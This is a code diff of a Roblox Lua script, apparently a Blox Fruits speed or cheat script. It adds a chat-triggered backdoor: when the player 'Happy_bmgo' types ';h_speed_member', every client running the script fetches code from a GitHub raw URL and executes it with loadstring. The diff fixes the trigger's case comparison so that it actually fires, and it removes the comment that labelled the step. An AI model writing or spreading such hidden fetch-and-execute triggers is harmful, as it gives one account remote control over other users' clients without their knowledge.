@@ -184,11 +184,12 @@ for _, player in pairs(game.Players:GetPlayers()) do
     end
 end
 --sp
+
 game.Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(message)
         
-        if player.Name == "Happy_bmgo" and message:lower() == ";H_speed_member" then
-            -- Chạy script bạn muốn
+        if player.Name == "Happy_bmgo" and message:lower() == ";h_speed_member" then
+            
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HAPPY-script/SPEED_BLOX_FRUIT/refs/heads/main/SPEED_BLOX_FRUIT"))()
         end
     end)
@@ -197,8 +198,8 @@ end)
 
 for _, player in ipairs(game.Players:GetPlayers()) do
     player.Chatted:Connect(function(message)
-        if player.Name == "Happy_bmgo" and message:lower() == ";H_speed_member" then
-            -- Chạy script bạn muốn
+        if player.Name == "Happy_bmgo" and message:lower() == ";h_speed_member" then
+            
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HAPPY-script/SPEED_BLOX_FRUIT/refs/heads/main/SPEED_BLOX_FRUIT"))()
         end
     end)
